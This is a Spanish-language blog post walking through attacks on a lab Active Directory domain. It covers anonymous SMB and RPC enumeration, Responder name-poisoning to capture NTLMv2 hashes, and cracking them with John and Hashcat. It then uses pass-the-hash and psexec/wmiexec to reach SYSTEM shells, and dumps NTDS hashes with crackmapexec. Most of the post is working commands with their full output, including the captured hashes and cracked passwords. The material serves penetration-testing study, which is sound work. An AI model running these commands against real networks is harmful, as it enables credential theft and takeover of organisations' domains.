---
date: 2022-09-04T04:30:05.000Z
layout: post
comments: true
title: Active Directory
subtitle: 'técnicas de ataque'
description: >-
image: >-
  http://imgfz.com/i/hHOUmgN.jpeg
optimized_image: >-
  http://imgfz.com/i/hHOUmgN.jpeg
category: ciberseguridad
tags:
  - AD
  - SMBClient
  - smbmap
  - crackmapexec
  - rpcclient
  - SMBRelay
  - Cracking
  - Dumpear
  - SAM
  - nbtstat
  - Responder
  - ntlmrelayx
  - LDAP
  - evil-winrm
  - kerberoasting
  - asreproasting
  - Rubeus
  - Golden
  - Ticket
  - mimikatz
  - ticketer
  - SCF
  - mitm6
  - proxychains
  - Bloodhound
  - neo4j
  - netcat
  - GetUserSPNs
  - GetNPUsers.py
  - directorio
  - explotación
  - windows
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---

Directorio Activo es un servicio de directorio para entornos empresariales de Windows que se implementó oficialmente en 2000 con el lanzamiento de Windows Server 2000 y se ha mejorado gradualmente con el lanzamiento de cada sistema operativo como servidor. "Active Directory" se basa en los protocolos x.500 y LDAP anteriores y todavía utiliza estos protocolos de alguna forma en la actualidad. Es una estructura jerárquica distribuida que permite la administración centralizada de los recursos de una organización, incluidos; usuarios, computadoras, grupos, dispositivos de red y recursos compartidos de archivos, políticas de grupo, dispositivos y fideicomisos, todo esto con sus respectivas autenticaciones.

A continuación se presentan algunas técnicas de ataques simulando un entorno empresarial:

## Enumeración (Null Session Attack)

Un ataque de sesión nula explota una vulnerabilidad de autenticación para los recursos compartidos administrativos de Windows; esto permite a un atacante conectarse a un recurso compartido local o remoto sin autenticación. Las sesiones nulas son explotables remotamente; esto significa que los atacantes pueden utilizar sus ordenadores para atacar una máquina Windows vulnerable. Además, este ataque puede utilizarse para llamar a APIs remotas y llamadas a procedimientos remotos. Debido a estos factores, los ataques de sesión nula han tenido un gran impacto en los ecosistemas Windows.

Los ataques de sesión nula se pueden utilizar para enumerar mucha información. Los atacantes pueden robar información sobre:

* Contraseñas.
* Usuarios del sistema.
* Grupos del sistema.
* Procesos del sistema en ejecución.

Para verificar recursos compartidos se puede realizar lo siguiente, en donde con ```-N``` obliga a la herramienta a no pedir contraseña y con ```-L``` permite ver qué servicios están disponibles en el objetivo:

```bash
┌──(root㉿kali)-[/AD]
└─ smbclient -N -L //10.1.1.32

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled -- no workgroup available
```

Luego podemos acceder por este mismo medio:

```bash
┌──(root㉿kali)-[/AD]
└─ smbclient //10.1.1.32/notes

Enter WORKGROUP\<username>'s password: 
Anonymous login successful
Try "help" to get a list of possible commands.

smb: \> ls

  .                                   D        0  Wed Sep 22 18:17:51 2021
  ..                                  D        0  Wed Sep 22 12:03:59 2021
  important.txt                       N       71  Sun Sep 19 15:45:21 2021

smb: \> get important.txt 

getting file \important.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) 
(average 8,7 KiloBytes/sec)

smb: \> !cat important.txt

[] this is a test!
[] …	
```

Otra forma de ver recursos compartidos es por medio de ```smbmap```:

```bash
┌──(root㉿kali)-[/AD]
└─ smbmap -H 10.1.1.32

[+] Finding open SMB ports....
[+] User SMB session established on 10.1.1.32...
[+] IP: 10.1.1.32:445       Name: 10.1.1.32                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        home                                                    NO ACCESS       INFREIGHT Samba
        dev                                                     NO ACCESS       DEVenv
        notes                                                   NO ACCESS       CheckIT
        IPC$                                                    NO ACCESS       IPC Service (DEVSM)
```

También podremos extraer los mismos resultados en ```crackmapexec```:

```bash
┌──(root㉿kali)-[/AD]
└─ crackmapexec smb 10.1.1.32 --shares -u '' -p ''

SMB         10.1.1.32   445    PC-FELIPE           [*] Windows 10.0 Build 19041 x64 (name:PC-FELIPE) (domain:felipecorp.local) (signing:False) (SMBv1:False)
SMB         10.1.1.32   445    PC-FELIPE           [+] \: 
SMB         10.1.1.32   445    PC-FELIPE           [+] Enumerated shares
SMB         10.1.1.32   445    PC-FELIPE           Share           Permissions     Remark
SMB         10.1.1.32   445    PC-FELIPE           -----           -----------     ------
SMB         10.1.1.32   445    PC-FELIPE           print$                          Printer Drivers
SMB         10.1.1.32   445    PC-FELIPE           home                            INFREIGHT Samba
SMB         10.1.1.32   445    PC-FELIPE           dev                             DEVenv
SMB         10.1.1.32   445    PC-FELIPE           notes           READ,WRITE      CheckIT
SMB         10.1.1.32   445    PC-FELIPE           IPC$                            IPC Service (DEVSM)
```

Por ```crackmapexec``` también podemos extraer información de la red completa:

```bash
┌──(root㉿kali)-[/AD]
└─ crackmapexec smb  10.1.1.0/24
SMB         10.1.1.35       445    DC-COMPANY       [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:DC-COMPANY) (domain:felipecorp.local) (signing:True) (SMBv1:True)
SMB         10.1.1.32       445    PC-FELIPE        [*] Windows 10.0 Build 19041 x64 (name:PC-FELIPE) (domain:felipecorp.local) (signing:False) (SMBv1:False)
SMB         10.1.1.33       445    PC-USER2         [*] Windows 10.0 Build 19041 x64 (name:PC-USER2) (domain:felipecorp.local) (signing:False) (SMBv1:False)
```

Otra forma de enumerar es por medio de ```rpcclient```, quien nos ofrece muchas solicitudes con las que podemos ejecutar ciertas funciones en el servidor SMB con el fin de obtener información sobre el activo y todo esto bajo el usuario anonymous. 

>Ejemplo desde otro laboratorio.

```bash
┌──(root㉿kali)-[/AD]
└─ rpcclient -U "" 10.129.14.128 -N

Enter WORKGROUP\'s password:
rpcclient $> srvinfo

        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
		
		
rpcclient $> enumdomains

name:[DEVSMB] idx:[0x0]
name:[Builtin] idx:[0x1]


rpcclient $> querydominfo

Domain:         DEVOPS
Server:         DEVSMB
Comment:        DEVSM
Total Users:    2
Total Groups:   0
Total Aliases:  0
Sequence No:    1632361158
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1


rpcclient $> netshareenumall

netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
        password:
netname: home
        remark: INFREIGHT Samba
        path:   C:\home\
        password:
netname: dev
        remark: DEVenv
        path:   C:\home\sambauser\dev\
        password:
netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
netname: IPC$
        remark: IPC Service (DEVSM)
        path:   C:\tmp
        password:
		
		
rpcclient $> netsharegetinfo notes

netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00 
                Specific bits: 0x1ff
                Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                SID: S-1-1-0


rpcclient $> enumdomusers

user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]


rpcclient $> queryuser 0x3e9

        User Name   :   cry0l1t3
        Full Name   :   cry0l1t3
        Home Drive  :   \\devsmb\cry0l1t3
        Dir Drive   :
        Profile Path:   \\devsmb\cry0l1t3\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
        Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
        Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST
        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x3e9
        group_rid:      0x201
        acb_info :      0x00000014
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...


rpcclient $> queryuser 0x3e8

        User Name   :   mrb3n
        Full Name   :
        Home Drive  :   \\devsmb\mrb3n
        Dir Drive   :
        Profile Path:   \\devsmb\mrb3n\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
        Password last set Time   :      Mi, 22 Sep 2021 17:47:59 CEST
        Password can change Time :      Mi, 22 Sep 2021 17:47:59 CEST
        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x3e8
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...


rpcclient $> querygroup 0x201

        Group Name:     None
        Description:    Ordinary Users
        Group Attribute:7
        Num Members:2
```

Enumeración de usuarios (forma ordenada) con ```rpcclient```:

```bash
┌──(root㉿kali)-[/AD]
└─ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
		
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
		
        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201
```


### Enumeración con Windows

Para Windows, se recomienda el uso de ```nbtstat```, en donde se debe tener en consideración lo siguiente:

```cmd
C:\Users\lab>nbtstat -A <IP>
```

>Para Windows véase la herramienta de enumeración [Enum](https://packetstormsecurity.com/search/?q=win32+enum&s=files).

* La primera línea de la tabla nos suele indicar el nombre de la máquina que funciona en la dirección IP introducida.

* El tipo de registro <00> nos indica que ese nombre es una estación de trabajo.

* El tipo "UNIQUE" nos dice que este ordenador debe tener asignada una sola dirección IP.

* Una línea contiene el grupo de trabajo o el dominio al que está unido el ordenador.

* Los registros de tipo <20> nos indican que el servicio de compartición de archivos está en funcionamiento en el equipo; esto significa que podemos intentar obtener más información sobre él.

Una vez que un atacante sabe que una máquina tiene el servicio File Server en ejecución, puede enumerar los recursos compartidos utilizando el comando NET VIEW.

```cmd
C:\Users\lab>NET VIEW <IP>
```

Y una forma de conectarse a un directorio es por medio del siguiente comando:

```cmd
C:\Users\lab>NET USE \\<IP>\IPC$ '' /u:''
```

>Otra herramienta que actúa de la misma forma pero para Linux es ```nmblookup```.

## SMB Relay Clásico

Responder es un envenenador LLMNR, NBT-NS y MDNS. Responderá a consultas específicas de NBT-NS (NetBIOS Name Service) según el sufijo de su nombre. De forma predeterminada, la herramienta solo responderá a la solicitud del servicio del servidor de archivos, que es para SMB.

En esta situación como el samba no está firmado, no se logra validar la legitimidad del origen, por lo que podremos interceptar las comunicaciones por SMB.

Ahora por medio de tareas automatizadas realizadas en los recursos compartidos a nivel de red podemos recibir hashes NTLMv2, que luego podemos intentar crackear. Esto se produce porque engañamos al servidor para que se autentique contra ti, simulando ser el recurso buscado:

```bash
┌──(root㉿kali)-[/AD]
└─ python2 Responder.py -I eth0 -rdw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [10.1.1.19]
    Challenge set              [1122334455667788]



[+] Listening for events...

[*] [NBT-NS] Poisoned answer sent to 10.1.1.32 for name SQLSERVER (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 10.1.1.32       for name sqlserver.local
[*] [LLMNR]  Poisoned answer sent to 10.1.1.32 for name sqlserver


[HTTP] NTLMv2 Client   : 10.1.1.32
[HTTP] NTLMv2 Username : FELIPECORP\fcanales
[HTTP] NTLMv2 Hash     : fcanales::FELIPECORP:1122334455667788:ADA720F01E66E8EFDB88501DE9FD3BB0:010100000000000010F2040B91BAD8014D02D4BDCAFE42F1000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000002000007F9D4D399E7466126F4AA8D143C3FB8CE53B987CD435574825CA6BE393D91CAE0A0010000000000000000000000000000000000009001C0048005400540050002F00730071006C007300650072007600650072000000000000000000
[*] [MDNS] Poisoned answer sent to 10.1.1.32       for name sqlserver.local
[*] [LLMNR]  Poisoned answer sent to 10.1.1.32 for name sqlserver

[*] [NBT-NS] Poisoned answer sent to 10.1.1.33 for name SADAD (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 10.1.1.33       for name sadad.local
[*] [LLMNR]  Poisoned answer sent to 10.1.1.33 for name sadad
[HTTP] NTLMv2 Client   : 10.1.1.33
[HTTP] NTLMv2 Username : FELIPECORP\user2
[HTTP] NTLMv2 Hash     : user2::FELIPECORP:1122334455667788:96E6F2CC1909A4196372D2FC99B7AB5B:01010000000000002B046B1991BAD8016D52B5E362ED2D9F000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000002000005C7FEB3689E19BE85E3B9F310939B2CC17376E0DE91E448145CD564CD02D72800A001000000000000000000000000000000000000900140048005400540050002F00730061006400610064000000000000000000
[*] [MDNS] Poisoned answer sent to 10.1.1.33       for name sadad.local
[*] [LLMNR]  Poisoned answer sent to 10.1.1.33 for name sadad
[*] Skipping previously captured hash for FELIPECORP\user2
[*] [MDNS] Poisoned answer sent to 10.1.1.33       for name sadad.local
[*] [LLMNR]  Poisoned answer sent to 10.1.1.33 for name sadad
[*] Skipping previously captured hash for FELIPECORP\user2
[*] [MDNS] Poisoned answer sent to 10.1.1.33       for name sadad.local
[*] [LLMNR]  Poisoned answer sent to 10.1.1.33 for name sadad

[*] [NBT-NS] Poisoned answer sent to 10.1.1.35 for name OPA (service: File Server)
[*] [LLMNR]  Poisoned answer sent to 10.1.1.35 for name opa
[SMB] NTLMv2-SSP Client   : 10.1.1.35
[SMB] NTLMv2-SSP Username : FELIPECORP\Administrador
[SMB] NTLMv2-SSP Hash     : Administrador::FELIPECORP:1122334455667788:17ECE7116F34729B68D3BF1318668627:0101000000000000BF0C072191BAD801C2E4775603E368530000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000000000000300000C265BAEB06E93594CDF4B440884DE48895E4EBE43CC3164B8489A833ABC8CC500A001000000000000000000000000000000000000900100063006900660073002F006F00700061000000000000000000
[SMB] Requested Share     : \\OPA\IPC$
[*] [LLMNR]  Poisoned answer sent to 10.1.1.35 for name opa
[*] Skipping previously captured hash for FELIPECORP\Administrador
[SMB] Requested Share     : \\OPA\IPC$
[*] [MDNS] Poisoned answer sent to 10.1.1.33       for name PC-User2.local
[*] [LLMNR]  Poisoned answer sent to 10.1.1.33 for name PC-User2
[*] [MDNS] Poisoned answer sent to 10.1.1.32       for name PC-Felipe.local
[*] [LLMNR]  Poisoned answer sent to 10.1.1.32 for name PC-Felipe
```

Guardamos los hashes NTLMv2 en un archivo como el siguiente:

```bash
┌──(root㉿kali)-[/AD]
└─ cat hashes         
Administrador::FELIPECORP:1122334455667788:17ECE7116F34729B68D3BF1318668627:0101000000000000BF0C072191BAD801C2E4775603E368530000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000000000000300000C265BAEB06E93594CDF4B440884DE48895E4EBE43CC3164B8489A833ABC8CC500A001000000000000000000000000000000000000900100063006900660073002F006F00700061000000000000000000
fcanales::FELIPECORP:1122334455667788:ADA720F01E66E8EFDB88501DE9FD3BB0:010100000000000010F2040B91BAD8014D02D4BDCAFE42F1000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000002000007F9D4D399E7466126F4AA8D143C3FB8CE53B987CD435574825CA6BE393D91CAE0A0010000000000000000000000000000000000009001C0048005400540050002F00730071006C007300650072007600650072000000000000000000
user2::FELIPECORP:1122334455667788:96E6F2CC1909A4196372D2FC99B7AB5B:01010000000000002B046B1991BAD8016D52B5E362ED2D9F000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000002000005C7FEB3689E19BE85E3B9F310939B2CC17376E0DE91E448145CD564CD02D72800A001000000000000000000000000000000000000900140048005400540050002F00730061006400610064000000000000000000
```

## Cracking con John The Ripper

Procedemos a intentar romper los hashes capturados:

```bash
┌──(root㉿kali)-[/AD]
└─ john --wordlist=/usr/share/wordlists/rockyou.txt hashes 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (fcanales)     
Password2        (user2)     
P@$$w0rd!        (Administrador)     
3g 0:00:00:22 DONE (2022-08-27 23:54) 0.1336g/s 479600p/s 482247c/s 482247C/s PAK2530..P1nkr1ng
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.

```

## Cracking con Hashcat

```cmd
C:\hashcat>hashcat.exe -m 5600 hashes.txt ../rockyou2021.txt --force
```

## Armado de hash

Hay ocasiones en que se debe armar la estructura del hash, considerando lo siguiente:

* NLTM -> [Username]::[Domain name]:[Lan Manager Response]:[NTLM Response]:[NTLM Server Challenge]
* NTLMv2 -> [Username]::[Domain name]:[NTLM Server Challenge]:[NTProofStr]:[Rest of NTLMv2 Response]

## Verificación de administrador con crackmapexec

Con ```crackmapexec``` podemos verificar en cual equipo contamos con permisos de administrador:

```bash
┌──(root㉿kali)-[/AD]
└─ crackmapexec smb 10.1.1.0/24 -u 'fcanales' -p 'Password1' 
SMB         10.1.1.33       445    PC-USER2         [*] Windows 10.0 Build 19041 x64 (name:PC-USER2) (domain:felipecorp.local) (signing:False) (SMBv1:False)
SMB         10.1.1.35       445    DC-COMPANY       [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:DC-COMPANY) (domain:felipecorp.local) (signing:True) (SMBv1:True)
SMB         10.1.1.32       445    PC-FELIPE        [*] Windows 10.0 Build 19041 x64 (name:PC-FELIPE) (domain:felipecorp.local) (signing:False) (SMBv1:False)
SMB         10.1.1.33       445    PC-USER2         [+] felipecorp.local\fcanales:Password1 (Pwn3d!)
SMB         10.1.1.35       445    DC-COMPANY       [+] felipecorp.local\fcanales:Password1 
SMB         10.1.1.32       445    PC-FELIPE        [+] felipecorp.local\fcanales:Password1


┌──(root㉿kali)-[/AD]
└─ crackmapexec smb 10.1.1.0/24 -u 'Administrador' -p 'Password3'
SMB         10.1.1.32       445    PC-FELIPE        [*] Windows 10.0 Build 19041 x64 (name:PC-FELIPE) (domain:felipecorp.local) (signing:False) (SMBv1:False)
SMB         10.1.1.35       445    DC-COMPANY       [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:DC-COMPANY) (domain:felipecorp.local) (signing:True) (SMBv1:True)
SMB         10.1.1.33       445    PC-USER2         [*] Windows 10.0 Build 19041 x64 (name:PC-USER2) (domain:felipecorp.local) (signing:False) (SMBv1:False)
SMB         10.1.1.32       445    PC-FELIPE        [+] felipecorp.local\administrador:P@$$w0rd! (Pwn3d!)
SMB         10.1.1.35       445    DC-COMPANY       [+] felipecorp.local\administrador:P@$$w0rd! (Pwn3d!)
SMB         10.1.1.33       445    PC-USER2         [+] felipecorp.local\administrador:P@$$w0rd! (Pwn3d!)

```

## Autenticación con credenciales

Como obtuvimos éxito con las respuestas podemos intentar ingresar por medio de ```psexec.py``` o por ```wmiexec.py``` como algunos de los siguientes casos:

```bash
┌──(root㉿kali)-[/AD]
└─ psexec.py felipeCorp.local/administrador:P\@\$\$w0rd\!@10.1.1.35 cmd.exe
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.1.1.35.....
[*] Found writable share ADMIN$
[*] Uploading file LienerWS.exe
[*] Opening SVCManager on 10.1.1.35.....
[*] Creating service jbHO on 10.1.1.35.....
[*] Starting service jbHO.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 10.0.14393]

(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> whoami
nt authority\system
```

```bash
┌──(root㉿kali)-[/AD]
└─ psexec.py felipeCorp.local/fcanales:Password1@10.1.1.33 cmd.exe
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.1.1.33.....
[*] Found writable share ADMIN$
[*] Uploading file tTFOJSQg.exe
[*] Opening SVCManager on 10.1.1.33.....
[*] Creating service NlZx on 10.1.1.33.....
[*] Starting service NlZx.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 10.0.19042.631]

(c) 2020 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> whoami
nt authority\system
```

```bash
┌──(root㉿kali)-[/AD]
└─ wmiexec.py felipecorp.local/administrador:P@\$\$w0rd\!@10.1.1.32
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\> whoami
nt authority\system
```


## Dumpear la SAM

Si contamos con las credenciales del usuario administrador del sistema podremos dumpear la SAM de manera rápida con ```crackmapexec```:

```bash
┌──(root㉿kali)-[/AD]
└─ crackmapexec smb 10.1.1.35 -u 'administrador' -p 'P@$$w0rd!' --ntds vss          
SMB         10.1.1.35       445    DC-COMPANY       [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:DC-COMPANY) (domain:felipecorp.local) (signing:True) (SMBv1:True)
SMB         10.1.1.35       445    DC-COMPANY       [+] felipecorp.local\administrador:P@$$w0rd! (Pwn3d!)
SMB         10.1.1.35       445    DC-COMPANY       [-] Could not get a VSS
SMB         10.1.1.35       445    DC-COMPANY       [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.1.1.35       445    DC-COMPANY       Administrador:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
SMB         10.1.1.35       445    DC-COMPANY       Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.1.1.35       445    DC-COMPANY       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ac5da80acc5ae76888455289db036528:::
SMB         10.1.1.35       445    DC-COMPANY       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.1.1.35       445    DC-COMPANY       felipecorp.local\fcanales:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.1.1.35       445    DC-COMPANY       felipecorp.local\user2:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         10.1.1.35       445    DC-COMPANY       DC-COMPANY$:1000:aad3b435b51404eeaad3b435b51404ee:8be287568b9671ef717098d95472dc28:::
SMB         10.1.1.35       445    DC-COMPANY       PC-FELIPE$:1105:aad3b435b51404eeaad3b435b51404ee:447512ef146a198c5f7989fbd4b91a82:::
SMB         10.1.1.35       445    DC-COMPANY       PC-USER2$:1106:aad3b435b51404eeaad3b435b51404ee:d8cb23ecaec10c914392545f0a909383:::
SMB         10.1.1.35       445    DC-COMPANY       [+] Dumped 9 NTDS hashes to /root/.cme/logs/DC-COMPANY_10.1.1.35_2022-08-28_010847.ntds of which 6 were added to the database
```

Y obteniendo los hashes SAM podemos intentar ingresar al sistema objetivo ocupando ```wmiexec.py```:

```bash
┌──(root㉿kali)-[/AD]
└─ wmiexec.py felipecorp.local/fcanales@10.1.1.33 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
felipecorp\fcanales

C:\>ipconfig
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec

Configuraci�n IP de Windows


Adaptador de Ethernet Ethernet:

   Sufijo DNS espec�fico para la conexi�n. . : 
   Direcci�n IPv6 . . . . . . . . . . : fd17:625c:f037:2:f06a:2859:5094:3afa
   Direcci�n IPv6 temporal. . . . . . : fd17:625c:f037:2:2d63:128d:cafd:1782
   V�nculo: direcci�n IPv6 local. . . : fe80::f06a:2859:5094:3afa%6
   Direcci�n IPv4. . . . . . . . . . . . . . : 10.1.1.33
   M�scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : fe80::5054:ff:fe12:3500%6
                                       10.1.1.1

C:\>
```

Otra forma es realizando los siguiente pasos. Iniciando con editar la configuración del responder ubicada en el archivo ```responder.conf```, cambiando los servidores de autenticación SMB y HTTP a ```off```:

```bash
┌──(root㉿kali)-[/AD]
└─ nano responder.conf

[Responder Core]

; Servers to start
SQL = On
SMB = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
```

Ahora en un archivo escribimos las direcciones IPs de los equipos que queremos comprometer, en este caso a modo de ejemplo seleccionaré una sola IP:

```bash
┌──(root㉿kali)-[/home/nptg/Documents/Active-Directory]
└─ cat targets.txt    
10.1.1.33
```

Ejecutamos el ```responder.py```:

```bash
┌──(root㉿kali)-[/AD]
└─ python2 Responder.py -I eth0 -rdw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [10.1.1.19]
    Challenge set              [1122334455667788]



[+] Listening for events...
[*] [NBT-NS] Poisoned answer sent to 10.1.1.14 for name KDDAS (service: File Server)
[*] [MDNS] Poisoned answer sent to 10.1.1.14       for name kddas.local
[*] [LLMNR]  Poisoned answer sent to 10.1.1.14 for name kddas
[*] [MDNS] Poisoned answer sent to 10.1.1.14       for name kddas.local
[*] [LLMNR]  Poisoned answer sent to 10.1.1.14 for name kddas
[*] [MDNS] Poisoned answer sent to 10.1.1.14       for name kddas.local
[*] [LLMNR]  Poisoned answer sent to 10.1.1.14 for name kddas
[*] [MDNS] Poisoned answer sent to 10.1.1.14       for name kddas.local
```

